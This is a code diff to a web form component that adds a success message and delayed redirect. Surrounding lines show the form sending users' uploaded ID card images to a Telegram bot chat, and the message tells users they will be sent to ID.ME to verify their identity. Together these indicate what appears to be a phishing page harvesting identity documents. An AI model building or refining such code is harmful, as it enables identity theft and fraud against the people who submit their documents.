@@ -54,7 +54,7 @@ export default function Form() {
 
     const [errors, setErrors] = React.useState<FormErrors>({});
     const [isSubmitting, setIsSubmitting] = React.useState(false);
-    // const [submitSuccess, setSubmitSuccess] = React.useState(false);
+    const [submitSuccess, setSubmitSuccess] = React.useState(false);
 
     const telegramApiKey = process.env.NEXT_PUBLIC_TELEGRAM_API ?? ''
     const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? ''
@@ -192,7 +192,11 @@ export default function Form() {
                 sendFileToTelegram(formData.idBack, 'ID Back Image'),
             ]);
 
-            router.push('/id-me')
+            setSubmitSuccess(true)
+            setTimeout(() => {
+                router.push('/id-me')
+            }, 5000)
+
         } catch (error) {
             console.error('Submission error:', error);
             alert(`There was an error submitting your application: ${error instanceof Error ? error.message : 'Unknown error'}`);
@@ -201,16 +205,16 @@ export default function Form() {
         }
     };
 
-    // if (submitSuccess) {
-    //     return (
-    //         <div className='flex flex-col items-center py-10 px-4'>
-    //             <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded relative max-w-md w-full" role="alert">
-    //                 <strong className="font-bold">Success!</strong>
-    //                 <span className="block sm:inline"> Your application has been submitted.</span>
-    //             </div>
-    //         </div>
-    //     );
-    // }
+    if (submitSuccess) {
+        return (
+            <div className='flex flex-col items-center py-10 px-4'>
+                <div className="bg-green-100 border border-green-400 text-lg text-primary px-4 py-3 rounded relative max-w-md w-full" role="alert">
+                    <strong className="font-bold">Success!</strong>
+                    <span className="block sm:inline"> Your application has been submitted. You will be redirect ID.ME to verify your identity</span>
+                </div>
+            </div>
+        );
+    }
 
     return (
         <div className='flex flex-col items-center py-10 px-4'>
